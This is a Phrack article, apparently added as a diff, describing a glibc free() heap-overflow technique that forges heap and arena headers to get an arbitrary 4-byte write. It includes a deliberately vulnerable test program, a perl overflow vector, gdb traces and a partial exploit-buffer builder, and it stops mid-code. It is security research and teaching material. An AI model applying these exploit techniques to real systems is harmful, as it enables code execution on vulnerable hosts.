@@ -1,0 +1,1404 @@
+				==Phrack Inc.==
+
+		Volume 0x0d, Issue 0x42, Phile #0x06 of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=-------------=[ Yet another free() exploitation technique ]=-----------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[    By huku                           ]=--------------=|
+|=---------------=[                                      ]=--------------=|
+|=---------------=[    huku <huku _at_ grhack _dot_ net  ]=--------------=|
+|=-----------------------------------------------------------------------=|
+
+
+---[ Contents
+
+I. Introduction
+II. Brief history of glibc heap exploitation
+III. Various facts regarding the glibc malloc() implementation
+  1. Chunk flags
+  2. Heaps, arenas and contiguity
+  3. The FIFO nature of the malloc() algorithm
+  4. The prev_size under our control
+  5. Debugging and options
+IV. In depth analysis on free()'s vulnerable paths
+  1. Introduction
+  2. A trip to _int_free()
+V. Controlling unsorted_chunks() return value
+VI. Creating fake heap and arena headers 
+VII. Putting it all together
+VIII. The ClamAV case 
+  1. The bug
+  2. The exploit
+IX. Epilogue
+X. References
+XI. Attachments
+
+
+---[ I. Introduction
+
+When articles [01] and [02] were released in Phrack 57, heap
+exploitation techniques became a common fashion. Various heap
+exploits were, and are still published on various security related
+lists and sites. Since then, the glibc code, and especially malloc.c,
+evolved dramatically and eventually, various heap protection schemes
+were added just to make exploitation harder.
+
+This article presents a new free() exploitation technique, different
+from those published at [06]. Yet, knowledge of [06] is assumed,
+as several concepts presented here are derived from the author's
+writings. Our technique makes use of 4 malloc() chunks (either
+directly allocated or fake ones constructed by the attacker) and
+achieves a '4 bytes anywhere' result. Our study focuses on the
+current situation of the glibc malloc() code and how one can bypass
+the security measures it imposes. The first two sections act as a
+flash back and as a rehash of older knowledge. Several important
+aspects regarding malloc() are also discussed. The aforementioned
+sections act as a foundation for the sections to follow. Finally,
+a real life scenario on ClamAV is presented as demonstration for
+our technique.
+
+The glibc versions revised during the analysis were 2.3.6, 2.4, 2.5
+and 2.6 (the latest version at the time of writing). Version 2.3.6
+was chosen due to the fact that glibc versions greater or equal to
+2.3.5 include additional security precautions. Examples were not
+tested on systems running glibc 2.2.x since it is considered quite
+obsolete.
+
+This article assumes basic knowledge of malloc() internals as they
+are described in [01] and [02]. If you haven't read them yet then
+probably you should do so now. The reader is also urged to read
+[03], [04] and [05]. Experience on real life heap overflows is also
+suggested but not required.
+
+
+---[ II. Brief history of glibc heap exploitation
+
+It is of common belief that the first person to publicly talk about
+heap overflows was Solar Designer back in the July of 2000. His
+related advisory [07], introduced the unlink() technique which was
+also characterized as a non-trivial process. By that time, Solar
+Designer wouldn't even imagine that this would be the start of a
+new era in exploitation methods. It was only a year later, in the
+August of 2001, when a more formal standardization of the term 'heap
+overflow' essentially appeared, right after the release of Phrack
+articles [01] and [02] written by MaXX and anonymous respectively.
+In his article, MaXX admitted that the technique Solar Designer had
+published, was already known 'in the wild' and was successfully
+used on programs like Netscape browsers, traceroute, and slocate.
+A huge volume of discoveries and exploits utilizing the disclosed
+techniques hit the lights of publicity. Some of the most notable
+research done at that time were [03], [04] and [05].
+
+In December 2003, Stefan Esser replies to some, innocent at the
+first sight, mail [08] announcing the availability of a dynamic
+library that protects against heap overflows. His own solution is
+very simple - just check that the 'fd' and 'bk' pointers are actually
+pointing where they should. His idea was then adopted by glibc-2.3.5
+along with other sanity checks thus rendering the unlink() and
+frontlink() techniques useless. The underground, at that time,
+assumes that pure malloc() heap overflows are gone but researchers
+sit back and start doing what they knew best, audit. The community
+remained silent for a long time. It is obvious that certain 0day
+techniques were developed but people appreciated their value and
+denied their disclosure.
+
+Fortunately, two persons decided to shed some light on the malloc()
+case. In 2005, Phatantasmal Phatasmagoria (the person responsible
+for the disclosure of the wilderness chunk exploitation techniques
+[09]) publishes the 'Malloc Malleficarum' [06]. His paper introduces
+5 new ways of bypassing the restrictions imposed by the latest glibc
+versions and is considered quite a masterpiece even today. In May
+the 27th 2007, g463 publishes [10], a very interesting paper
+describing a new technique exploiting set_head() and the topmost
+chunk. With this method, one could achieve an 'almost 4 bytes almost
+anywhere' condition. In this article, g463 explains how his technique
+can be used to flip the heap onto the stack and proves it by coding
+a neat exploit for file(1). The community receives another excellent
+paper which proves that exploitation is an art.
+
+But enough about the past. Before entering a new chapter of the
+malloc() history, the author would like to clarify a few details
+regarding malloc() internals. It's actually the very basis of what
+will follow.
+
+
+---[ III. Various facts regarding the glibc malloc() implementation
+
+--[ 1. Chunk flags
+
+Probably, you are already familiar with the layout of the malloc()
+chunk header as well as with its 'size' and 'prev_size' fields.
+What is usually overlooked is the fact that apart from PREV_INUSE,
+the 'size' field may also contain two more flags, the IS_MMAPPED
+and the NON_MAIN_ARENA, the latter being the most interesting one.
+When the NON_MAIN_ARENA flag is set, it indicates that the chunk
+is part of an independent mmap()'ed memory region.
+
+--[ 2. Heaps, arenas and contiguity
+
+The malloc() interface does not guarantee contiguity but tries to
+achieve it whenever possible. In fact, depending on the underlying
+architecture and the compilation options, contiguity checks may not
+even be performed. When the system is hungry for memory, if the
+main (the default) arena is locked and busy serving other requests
+(requests possibly coming from other threads of the same process),
+malloc() will try to allocate and initialize a new mmap()'ed region,
+called a 'heap'. Schematically, a heap looks like the following
+figure.
+
+  ...+----------+-----------+---------+-...-+---------+...
+     | Heap hdr | Arena hdr | Chunk_1 |     | Chunk_n |
+  ...+----------+-----------+---------+-...-+---------+...
+
+The heap starts with a, so called, heap header which is physically
+followed by an arena header (also called a 'malloc state' or just
+'mstate'). Below, you can see the layout of these structures.
+
+--- snip ---
+typedef struct _heap_info {
+  mstate ar_ptr;           /* Arena for this heap   */ 
+  struct _heap_info *prev; /* Previous heap         */
+  size_t size;             /* Current size in bytes */
+  size_t mprotect_size;    /* Mprotected size       */
+} heap_info;
+--- snip ---
+
+--- snip ---
+struct malloc_state {
+  mutex_t mutex;                   /* Mutex for serialized access */
+  int flags;                       /* Various flags               */
+  mfastbinptr fastbins[NFASTBINS]; /* The fastbin array           */
+  mchunkptr top;                   /* The top chunk               */
+  mchunkptr last_remainder;        /* The rest of a chunk split   */
+  mchunkptr bins[NBINS * 2 - 2];   /* Normal size bins            */
+  unsigned int binmap[BINMAPSIZE]; /* The bins[] bitmap           */
+  struct malloc_state *next;       /* Pointer to the next arena   */
+  INTERNAL_SIZE_T system_mem;      /* Allocated memory            */
+  INTERNAL_SIZE_T max_system_mem;  /* Max memory available        */
+};
+
+typedef struct malloc_chunk *mchunkptr;
+typedef struct malloc_chunk *mbinptr;
+typedef struct malloc_chunk *mfastbinptr;
+--- snip ---
+
+The heap header should always be aligned to a 1Mbyte boundary and
+since its maximum size is 1Mbyte, the address of a chunk's heap can
+be easily calculated using the following formula.
+
+--- snip ---
+#define HEAP_MAX_SIZE (1024*1024)
+
+#define heap_for_ptr(ptr) \
+ ((heap_info *)((unsigned long)(ptr) & ~(HEAP_MAX_SIZE-1)))
+--- snip ---
+
+Notice that the arena header contains a field called 'flags'. The
+3rd MSB of this integer indicates wether the arena is contiguous
+or not. If not, certain contiguity checks during malloc() and free()
+are ignored and never performed. By taking a closer look at the
+heap header, one can also notice that a field named 'ar_ptr' also
+exists, which of course, should point to the arena header of the
+current heap. Since the arena header physically borders the heap
+header, the 'ar_ptr' field can easily be calculated by adding the
+size of the heap_info structure to the address of the heap itself.
+
+--[ 3. The FIFO nature of the malloc() algorithm
+
+The glibc malloc() implementation is a first fit algorithm (as
+opposed to best fit algorithms). That is, when the user requests N
+bytes, the allocator searches for the first chunk with size bigger
+or equal to N. Then, the chunk is split, and one half (of size N)
+is returned to the user while the other half plays the role of the
+last remainder. Additionally, due to a feature called 'unsorted
+chunks', the heap blocks are returned back to the user in a FIFO
+fashion (the most recently free()'ed blocks are first scanned).
+This may allow an attacker to allocate a chunk within various heap
+holes that may have resulted after calling free() or realloc().
+
+--- snip ---
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+  void *a, *b, *c;
+
+  a = malloc(16);
+  b = malloc(16);
+  fprintf(stderr, "a = %p | b = %p\n", a, b);
+
+  a = realloc(a, 32);
+  fprintf(stderr, "a = %p | b = %p\n", a, b);
+
+  c = malloc(16);
+  fprintf(stderr, "a = %p | b = %p | c = %p\n", a, b, c);
+  
+  free(a);    
+  free(b);    
+  free(c);    
+  return 0;
+}
+--- snip ---
+
+This code will allocate two chunks of size 16. Then, the first chunk
+is realloc()'ed to a size of 32 bytes. Since the first two chunks
+are physically adjacent, there's not enough space to extend 'a'.
+The allocator will return a new chunk which, physically, resides
+somewhere after 'a'. Hence, a hole is created before the first
+chunk. When the code requests a new chunk 'c' of size 16, the
+allocator notices that a free chunk exists (actually, this is the
+most recently free()'ed chunk) which can be used to satisfy the
+request. The hole is returned to the user. Let's verify.
+
+--- snip ---
+$ ./test 
+a = 0x804a050 | b = 0x804a068
+a = 0x804a080 | b = 0x804a068
+a = 0x804a080 | b = 0x804a068 | c = 0x804a050
+--- snip --- 
+
+Indeed, chunk 'c' and the initial 'a', have the same address.
+
+--[ 4. The prev_size under our control
+
+A potential attacker always controls the 'prev_size' field of the
+next chunk even if they are unable to overwrite anything else. The
+'prev_size' lies on the last 4 bytes of the usable space of the
+attacker's chunk. For all you C programmers, there's a function
+called malloc_usable_size() which returns the usable size of
+malloc()'ed area given the corresponding pointer. Although there's
+no manual page for it, glibc exports this function for the end user.
+
+--[ 5. Debugging and options
+
+Last but not least, the signedness and size of the 'size' and
+'prev_size' fields are totally configurable. You can change them
+by resetting the INTERNAL_SIZE_T constant. Throughout this article,
+the author used a x86 32bit system with a modified glibc, compiled
+with the default options. For more info on the glibc compilation
+for debugging purposes see [11], a great blog entry written by
+Echothrust's Chariton Karamitas (hola dude!).
+
+
+---[ IV. In depth analysis on free()'s vulnerable paths
+
+--[ 1. Introduction
+
+Before getting into more details, the author would like to stress
+the fact that the technique presented here requires that the attacker
+is able to write null bytes. That is, this method targets read(),
+recv(), memcpy(), bcopy() or similar functions. The str*cpy() family
+of functions can only be exploited if certain conditions apply (e.g.
+when decoding routines like base64 etc are used). This is, actually,
+the only real life limitation that this technique faces.
+
+In order to bypass the restrictions imposed by glibc an attacker
+must have control over at least 4 chunks. They can overflow the
+first one and wait until the second is freed. Then, a '4 bytes
+anywhere' result is achieved (an alternative technique is to create
+fake chunks rather than expecting them to be allocated, just read
+on). Finding 4 contiguous chunks in the system memory is not a
+serious matter. Just consider the case of a daemon allocating a
+buffer for each client. The attacker can force the daemon to allocate
+contiguous buffers into the heap by repeatedly firing up connections
+to the target host. This is an old technique used to stabilize the
+heap state (e.g in openssl-too-open.c). Controlling the heap memory
+allocation and freeing is a fundamental precondition required to
+build any decent heap exploit after all.
+
+Ok, let's start the actual analysis. Consider the following piece
+of code.
+
+--- snip ---
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[]) {
+  char *ptr, *c1, *c2, *c3, *c4;
+  int i, n, size;
+
+  if(argc != 3) {
+    fprintf(stderr, "%s <n> <size>\n", argv[0]);
+    return -1;
+  }
+
+  n = atoi(argv[1]);
+  size = atoi(argv[2]);
+
+  for(i = 0; i < n; i++) {
+    ptr = malloc(size);
+    fprintf(stderr, "[~] Allocated %d bytes at %p-%p\n",
+      size, ptr, ptr+size);
+  }
+
+  c1 = malloc(80);
+  fprintf(stderr, "[~] Chunk 1 at %p\n", c1);
+
+  c2 = malloc(80);
+  fprintf(stderr, "[~] Chunk 2 at %p\n", c2);
+
+  c3 = malloc(80);
+  fprintf(stderr, "[~] Chunk 3 at %p\n", c3);
+
+  c4 = malloc(80);
+  fprintf(stderr, "[~] Chunk 4 at %p\n", c4);
+
+  read(fileno(stdin), c1, 0x7fffffff); /* (1) */
+
+  fprintf(stderr, "[~] Freeing %p\n", c2);
+  free(c2); /* (2) */
+
+  return 0;
+}
+--- snip ---
+
+This is a very typical situation on many programs, especially network
+daemons. The for() loop emulates the ability of the user to force
+the target program perform a number of allocations, or just indicates
+that a number of allocations have already taken place before the
+attacker is able to write into a chunk. The rest of the code allocates
+four contiguous chunks. Notice that the first one is under the
+attacker's control. At (2) the code calls free() on the second
+chunk, the one physically bordering the attacker's block. To see
+what happens from there on, one has to delve into the glibc free()
+internals.
+
+When a user calls free() within the userspace, the wrapper __libc_free()
+is called. This wrapper is actually the function public_fREe()
+declared in malloc.c. Its job is to perform some basic sanity checks
+and then control is passed to _int_free() which does the hard work
+of actually freeing the chunk. The whole code of _int_free() consists
+of a 'if', 'else if' and 'else' block, which handles chunks depending
+on their properties. The 'if' part handles chunks that belong to
+fast bins (i.e whose size is less than 64 bytes), the 'else if'
+part is the one analyzed here and the one that handles bigger chunks.
+The last 'else' clause is used for very big chunks, those that were
+actually allocated by mmap().
+
+--[ 2. A trip to _int_free()
+
+In order to fully understand the structure of _int_free(), let us
+examine the following snippet.
+
+--- snip ---
+void _int_free(...) {
+  ...
+
+  if(...) {
+    /* Handle chunks of size less than 64 bytes. */
+  }
+  else if(...) {
+    /* Handle bigger chunks. */
+  }
+  else {
+    /* Handle mmap()ed chunks. */
+  }
+}
+--- snip ---
+
+One should actually be interested in the 'else if' part which handles
+chunks of size larger than 64 bytes. This means, of course, that
+the exploitation method presented here works only for such chunk
+sizes but this is not much of a big obstacle as most everyday
+applications allocate chunks usually larger than this.
+
+So, let's see what happens when _int_free() is eventually reached.
+Imagine that 'p' is the pointer to the second chunk (the chunk named
+'c2' in the snippet of the previous section), and that the attacker
+controls the chunk just before the one passed to _int_free(). Notice
+that there are two more chunks after 'p' which are not directly
+accessed by the attacker. Here's a step by step guide to _int_free().
+Make sure you read the comments very carefully.
+
+--- snip ---
+/* Let's handle chunks that have a size bigger than 64 bytes
+ * and that are not mmap()ed. 
+ */
+else if(!chunk_is_mmapped(p)) { 
+  /* Get the pointer to the chunk next to the one 
+   * being freed. This is the pointer to the third 
+   * chunk (named 'c3' in the code).
+   */
+  nextchunk = chunk_at_offset(p, size);
+
+  /* 'p' (the chunk being freed) is checked whether it 
+   * is the av->top (the topmost chunk of this arena). 
+   * Under normal circumstances this test is passed.
+   * Freeing the wilderness chunk is not a good idea 
+   * after all.
+   */
+  if(__builtin_expect(p == av->top, 0)) {
+    errstr = "double free or corruption (top)";
+    goto errout;
+  }
+ 
+  ...
+  ...
+--- snip ---
+
+So, first _int_free() checks if the chunk being freed is the top
+chunk. This is of course false, so the attacker can ignore this
+test as well as the following three.
+
+--- snip ---
+  /* Another lightweight check. Glibc checks here if 
+   * the chunk next to the one being freed (the third 
+   * chunk, 'c3') lies beyond the boundaries of the 
+   * current arena. This is also kindly passed.
+   */
+  if(__builtin_expect(contiguous(av)
+    && (char *)nextchunk >= ((char *)av->top + chunksize(av->top)), 0)) {
+      errstr = "double free or corruption (out)";
+      goto errout;
+  }
+
+  /* The PREV_INUSE flag of the third chunk is checked. 
+   * The third chunk indicates that the second chunk
+   * is in use (which is the default).
+   */
+  if(__builtin_expect(!prev_inuse(nextchunk), 0)) {
+    errstr = "double free or corruption (!prev)";
+    goto errout;
+  }
+
+  /* Get the size of the third chunk and check if its 
+   * size is less than 8 bytes or more than the system 
+   * allocated memory. This test is easily bypassed 
+   * under normal circumstances.
+   */ 
+  nextsize = chunksize(nextchunk);
+  if(__builtin_expect(nextchunk->size <= 2 * SIZE_SZ, 0)
+    || __builtin_expect(nextsize >= av->system_mem, 0)) {
+      errstr = "free(): invalid next size (normal)";
+      goto errout;
+  }
+
+  ...
+  ...
+--- snip ---    
+
+Glibc will then check if backward consolidation should be performed.
+Remember that the chunk being free()'ed is the one named 'c2' and
+that 'c1' is under the attacker's control. Since 'c1' physically
+borders 'c2', backward consolidation is not feasible.
+
+--- snip ---
+  /* Check if the chunk before 'p' (named 'c1') is in 
+   * use and if not, consolidate backwards. This is false. 
+   * The attacker controls the first chunk and this code 
+   * is skipped as the first chunk is considered in use 
+   * (the PREV_INUSE flag of the second chunk is set).
+   */
+  if(!prev_inuse(p)) {
+    ...
+    ...
+  }
+--- snip ---    
+
+The most interesting code snippet is probably the one below:
+ 
+--- snip ---
+  /* Is the third chunk the top one? If not then... */ 
+  if(nextchunk != av->top) {
+    /* Get the prev_inuse flag of the fourth chunk (i.e 
+     * 'c4'). One must overwrite this in order for glibc 
+     * to believe that the third chunk is in use. This 
+     * way forward consolidation is avoided.
+     */
+    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
+  
+    ...
+    ...
+
+    /* (1) */
+    bck = unsorted_chunks(av);
+    fwd = bck->fd; 
+    p->bk = bck;
+    p->fd = fwd;
+    /* The 'p' pointer is controlled by the attacker. 
+     * It's the prev_size field of the second chunk 
+     * which is accessible at the end of the usable 
+     * area of the attacker's chunk.
+     */
+    bck->fd = p;
+    fwd->bk = p;
+
+    ...
+    ...
+  }
+--- snip ---
+
+So, (1) is eventually reached. In case you didn't notice this is
+an old fashioned unlink() pointer exchange where unsorted_chunks(av)+8
+gets the value of 'p'. Now recall that 'p' points to the 'prev_size'
+of the chunk being freed, a piece of information that the attacker
+controls. So assuming that the attacker somehow forces the return
+value of unsorted_chunks(av)+8 to point somewhere he pleases (e.g
+.got or .dtors) then the pointer there gets the value of 'p'.
+'prev_size', being a 32bit integer, is not enough for storing any
+real shellcode, but it's enough for branching anywhere via JMP
+instructions. Let's not cope with such minor details yet, here's
+how one may force free() to follow the aforementioned code path.
+
+--- snip ---
+$ # 72 bytes of alphas for the data area of the first chunk
+$ # 4 bytes prev_size of the next chunk (still in the data area)
+$ # 4 bytes size of the second chunk (PREV_INUSE set)
+$ # 76 bytes of garbage for the second chunk's data
+$ # 4 bytes size of the third chunk (PREV_INUSE set)
+$ # 76 bytes of garbage for the third chunk's data
+$ # 4 bytes size of the fourth chunk (PREV_INUSE set)
+$ perl -e 'print "A" x 72, 
+> "\xef\xbe\xad\xde", 
+> "\x51\x00\x00\x00", 
+> "B" x 76,
+> "\x51\x00\x00\x00", 
+> "C" x 76, 
+> "\x51\x00\x00\x00"' > VECTOR
+$ ldd ./test
+        linux-gate.so.1 =>  (0xb7fc0000)
+        libc.so.6 => /home/huku/test_builds/lib/libc.so.6 (0xb7e90000)
+        /home/huku/test_builds/lib/ld-linux.so.2 (0xb7fc1000)
+$ gdb -q ./test
+(gdb) b _int_free
+Function "_int_free" not defined.
+Make breakpoint pending on future shared library load? (y or [n]) y
+Breakpoint 1 (_int_free) pending.
+(gdb) run 1 80 < VECTOR
+Starting program: /home/huku/test 1 80 < VECTOR
+[~] Allocated 80 bytes at 0x804a008-0x804a058
+[~] Chunk 1 at 0x804a060
+[~] Chunk 2 at 0x804a0b0
+[~] Chunk 3 at 0x804a100
+[~] Chunk 4 at 0x804a150
+[~] Freeing 0x804a0b0
+
+Breakpoint 1, _int_free (av=0xb7f85140, mem=0x804a0b0) at malloc.c:4552
+4552      p = mem2chunk(mem);
+(gdb) step
+4553      size = chunksize(p);
+...
+...
+(gdb) step 
+4688          bck = unsorted_chunks(av);
+(gdb) step
+4689          fwd = bck->fd;
+(gdb) step
+4690          p->fd = fwd;
+(gdb) step
+4691          p->bk = bck;
+(gdb) step
+4692          if (!in_smallbin_range(size))
+(gdb) step
+4697          bck->fd = p;
+(gdb) print (void *)bck->fd
+$1 = (void *) 0xb7f85170
+(gdb) print (void *)p
+$2 = (void *) 0x804a0a8
+(gdb) x/4bx (void *)p
+0x804a0a8:      0xef    0xbe    0xad    0xde
+(gdb) quit
+The program is running.  Exit anyway? (y or n) y
+--- snip ---
+
+So, 'bck->fd' has a value of 0xb7f85170, which is actually the 'fd'
+field of the first unsorted chunk. Then, 'fd' gets the value of 'p'
+which points to the 'prev_size' of the second chunk (called 'c2'
+in the code snippet). The attacker places the value 0xdeadbeef over
+there. Eventually, the following question arises: How can one control
+unsorted_chunks(av)+8? Giving arbitrary values to unsorted_chunks()
+may result in a '4 bytes anywhere' condition, just like the old
+fashioned unlink() technique.
+
+
+
+---[ V. Controlling unsorted_chunks() return value
+
+The unsorted_chunks() macro is defined as follows.
+
+--- snip ---
+#define unsorted_chunks(M) (bin_at(M, 1))
+--- snip ---
+
+--- snip ---
+#define bin_at(m, i) \
+  (mbinptr)(((char *)&((m)->bins[((i) - 1) * 2])) \
+    - offsetof(struct malloc_chunk, fd))
+--- snip ---
+
+The 'M' and 'm' parameters of these macros refer to the arena where
+a chunk belongs. A real life usage of unsorted_chunks() is briefly
+shown below.
+
+--- snip ---
+ar_ptr = arena_for_chunk(p);
+...
+...
+bck = unsorted_chunks(ar_ptr);
+--- snip ---
+
+The arena for chunk 'p' is first looked up and then used in the
+unsorted_chunks() macro. What is now really interesting is the way
+the malloc() implementation finds the arena for a given chunk.
+
+--- snip ---
+#define arena_for_chunk(ptr) \
+ (chunk_non_main_arena(ptr) ? heap_for_ptr(ptr)->ar_ptr : &main_arena)
+--- snip ---
+
+--- snip ---
+#define chunk_non_main_arena(p) ((p)->size & NON_MAIN_ARENA)
+--- snip ---
+
+--- snip ---
+#define heap_for_ptr(ptr) \
+ ((heap_info *)((unsigned long)(ptr) & ~(HEAP_MAX_SIZE-1)))
+--- snip ---
+
+For a given chunk (like 'p' in the previous snippet), glibc checks
+whether this chunk belongs to the main arena by looking at the
+'size' field. If the NON_MAIN_ARENA flag is set, heap_for_ptr() is
+called and the 'ar_ptr' field is returned. Since the attacker
+controls the 'size' field of a chunk during an overflow condition,
+she can set or unset this flag at will. But let's see what's the
+return value of heap_for_ptr() for some sample chunk addresses.
+
+--- snip ---
+#include <stdio.h>
+#include <stdlib.h>
+
+#define HEAP_MAX_SIZE (1024*1024)
+
+#define heap_for_ptr(ptr) \
+ ((void *)((unsigned long)(ptr) & ~(HEAP_MAX_SIZE-1)))
+
+int main(int argc, char *argv[]) {
+  size_t i, n;
+  void *chunk, *heap;
+
+  if(argc != 2) {
+    fprintf(stderr, "%s <n>\n", argv[0]);
+    return -1;
+  }
+
+  if((n = atoi(argv[1])) <= 0) 
+    return -1;
+
+  chunk = heap = NULL;
+  for(i = 0; i < n; i++) {
+     while((chunk = malloc(1024)) != NULL) {
+       if(heap_for_ptr(chunk) != heap) {
+         heap = heap_for_ptr(chunk);
+         break;
+       }
+     }
+
+     fprintf(stderr, "%.2d heap address: %p\n",
+       i+1, heap);
+  }
+
+  return 0;
+}
+--- snip ---
+
+Let's compile and run.
+
+--- snip ---
+$ ./test 10
+01 heap address: 0x8000000
+02 heap address: 0x8100000
+03 heap address: 0x8200000
+04 heap address: 0x8300000
+05 heap address: 0x8400000
+06 heap address: 0x8500000
+07 heap address: 0x8600000
+08 heap address: 0x8700000
+09 heap address: 0x8800000
+10 heap address: 0x8900000
+--- snip ---
+
+This code prints the first N heap addresses. So, for a chunk that
+has an address of 0xdeadbeef, its heap location is at most 1Mbyte
+backwards. Precisely, chunk 0xdeadbeef belongs to heap 0xdea00000.
+So if an attacker controls the location of a chunk's theoretical
+heap address, then by overflowing the 'size' field of this chunk,
+they can fool free() to assume that a valid heap header is stored
+there. Then, by carefully setting up fake heap and arena headers,
+an attacker may be able to force unsorted_chunks() to return a value
+of their choice.
+
+This is not a rare situation; in fact this is how most real life
+heap exploits work. Forcing the target application to perform a
+number of continuous allocations, helps the attacker control the
+arena header. Since the heap is not randomized and the chunks are
+sequentially allocated, the heap addresses are static and can be
+used across all targets! Even if the target system is equipped with
+the latest kernel and has heap randomization enabled, the heap
+addresses can be easily brute forced since a potential attacker
+only needs to know the upper part of an address rather than some
+specific location in the virtual address space.
+
+Notice that the code shown in the previous snippet always produces
+the same results and precisely the ones depicted above. That is,
+given the approximation of the address of some chunk one tries to
+overflow, the heap address can be easily precalculated using
+heap_for_ptr().
+
+For example, suppose that the last chunk allocated by some application
+is located at the address 0x080XXXXX. Suppose that this chunk belongs
+to the main arena, but even If it wouldn't, its heap address would
+be 0x080XXXXX & 0xfff00000 = 0x08000000. All one has to do is to
+force the application perform a number of allocations until the
+target chunk lies beyond 0x08100000. Then, if the target chunk has
+an address of 0x081XXXXX, by overflowing its 'size' field, one can
+make free() assume that it belongs to some heap located at 0x08100000.
+This area is controlled by the attacker who can place arbitrary
+data there. When public_fREe() is called and sees that the heap
+address for the chunk to be freed is 0x08100000, it will parse the
+data there as if it were a valid arena. This will give the attacker
+the chance to control the return value of unsorted_chunks().
+
+
+---[ VI. Creating fake heap and arena headers 
+
+Once an attacker controls the contents of the heap and arena headers,
+what are they supposed to place there? Placing random arbitrary
+values may result in the target application getting stuck by entering
+endless loops or even segfaulting before its time, so, one should
+be careful in not causing such side effects. In this section, we
+deal with this problem. Proper values for various fields are shown
+and an exploit for our example code is developed.
+
+Right after entering _int_free(), do_check_chunk() is called in
+order to perform lightweight sanity checks on the chunk being freed.
+Below is a code snippet taken from the aforementioned function.
+Certain pieces were removed for clarity.
+
+--- snip ---
+char *max_address = (char*)(av->top) + chunksize(av->top);
+char *min_address = max_address - av->system_mem;
+
+if(p != av->top) {
+  if(contiguous(av)) {
+    assert(((char*)p) >= min_address);
+    assert(((char*)p + sz) <= ((char*)(av->top)));
+  }
+}
+--- snip ---
+
+The do_check_chunk() code fetches the pointer to the topmost chunk
+as well as its size. Then 'max_address' and 'min_address' get the
+values of the higher and the lower available address for this arena
+respectively. Then, 'p', the pointer to the chunk being freed is
+checked against the pointer to the topmost chunk. Since one should
+not free the topmost chunk, this code is, under normal conditions,
+bypassed. Next, the arena named 'av', is tested for contiguity. If
+it's contiguous, chunk 'p' should fall within the boundaries of its
+arena; if not the checks are kindly ignored.
+
+So far there are two restrictions. The attacker should provide a
+valid 'av->top' that points to a valid 'size' field. The next set
+of restrictions are the assert() checks which will mess the
+exploitation. But let's first focus on the macro named contiguous().
+
+--- snip ---
+#define NCONTIGUOUS_BIT  (2U)
+#define contiguous(M)    (((M)->flags & NONCONTIGUOUS_BIT) == 0)
+--- snip ---
+
+Since the attacker controls the arena flags, if they set it to some
+integer having the third least significant bit set, then contiguous(av)
+is false and the assert() checks are ignored. Additionally, providing
+an 'av->top' pointer equal to the heap address, results in 'max_address'
+and 'min_address' getting valid values, thus avoiding annoying
+segfaults due to invalid pointer accesses. It seems that the first
+set of problems was easily solved.
+
+Do you think it's over? Hell no. After some lines of code are
+executed, _int_free() uses the macro __builtin_expect() to check
+if the size of the chunk right next to the one being freed (the
+third chunk) is larger than the total available memory of the arena.
+This is a good measure for detecting overflows and any decent
+attacker should get away with it.
+
+--- snip ---
+nextsize = chunksize(nextchunk);
+if(__builtin_expect(nextchunk->size <= 2 * SIZE_SZ, 0)
+  || __builtin_expect(nextsize >= av->system_mem, 0)) {
+    errstr = "free(): invalid next size (normal)";
+    goto errout;
+} 
+--- snip ---
+
+By setting 'av->system_mem' equal to 0xffffffff, one can bypass any
+check regarding the available memory and obviously this one as well.
+Although important for the internal workings of malloc(), the
+'av->max_system_mem' field can be zero since it won't get on the
+attacker's way.
+
+Unfortunately, before even reaching _int_free(), in public_fREe(),
+the mutex for the current arena is locked. Here's the snippet trying
+to achieve a valid lock sequence.
+
+--- snip ---
+#if THREAD_STATS
+  if(!mutex_trylock(&ar_ptr->mutex))
+    ++(ar_ptr->stat_lock_direct);
+  else {
+    mutex_lock(&ar_ptr->mutex);
+    ++(ar_ptr->stat_lock_wait);
+  }
+#else
+  mutex_lock(&ar_ptr->mutex);
+#endif
+--- snip ---
+
+In order to see what happens I had to delve into the internals of
+the NPTL library (also part of glibc). Since NPTL is out of the
+scope of this article I won't explain everything here. Briefly, the
+mutex is represented by a pthread_mutex_t structure consisting of
+5 integers. Giving invalid or random values to these integers will
+result in the code waiting until mutex's release. After messing
+with the NPTL internals, I noticed that setting all the integers
+to 0 will result in the mutex being acquired and locked properly.
+The code then continues execution without further problems.
+
+Right now there are no more restrictions, we can just place the
+value 0x08100020 (the heap header offset plus the heap header size)
+in the 'ar_ptr' field of the _heap_info structure, and give the
+value retloc-12 to bins[0] (where retloc is the return location
+where the return address will be written). Recall that the return
+address points to the 'prev_size' field of the chunk being freed,
+an integer under the attacker's control. What should one place
+there? This is another problem that needs to be solved.
+
+Since only a small amount of bytes is needed for the heap and the
+arena headers at 0x08100000 (or similar address), one can use this
+area for storing shellcode and nops as well. By setting the 'prev_size'
+field of the chunk being freed equal to a JMP instruction, one can
+branch some bytes ahead or backwards so that execution is transfered
+somewhere in 0x08100000 but, still, after the heap and arena headers!
+Valid locations are 0x08100000+X with X >= 72, that is, X should
+be an offset after the heap header and after bins[0]. This is not
+as complicated as it sounds, in fact, all addresses needed for
+exploitation are static and can be easily precalculated!
+
+The code below triggers a '4 bytes anywhere' condition.
+
+--- snip ---
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main() {
+  char buffer[65535], *arena, *chunks;
+
+  /* Clean up the buffer. */
+  bzero(buffer, sizeof(buffer));
+
+  /* Pointer to the beginning of the arena header. */
+  arena = buffer + 360;
+  
+  /* Pointer to the arena header -- offset 0. */
+  *(unsigned long int *)&arena[0]  = 0x08100000 + 12;
+
+  /* Arena flags -- offset 16. */
+  *(unsigned long int *)&arena[16] = 2;
+
+  /* Pointer to fake top -- offset 60. */ 
+  *(unsigned long int *)&arena[60]  = 0x08100000;
+ 
+  /* Return location minus 12 -- offset 68. */
+  *(unsigned long int *)&arena[68]  = 0x41414141 - 12;
+
+  /* Available memory for this arena -- offset 1104. */
+  *(unsigned long int *)&arena[1104]  = 0xffffffff;
+ 
+  /* Pointer to the second chunk's prev_size (shellcode). */
+  chunks = buffer + 10240;
+  *(unsigned long int *)&chunks[0] = 0xdeadbeef;
+
+  /* Pointer to the second chunk. */
+  chunks = buffer + 10244;
+
+  /* Size of the second chunk (PREV_INUSE+NON_MAIN_ARENA). */
+  *(unsigned long int *)&chunks[0] = 0x00000055;
+
+  /* Pointer to the third chunk. */
+  chunks = buffer + 10244 + 80;
+
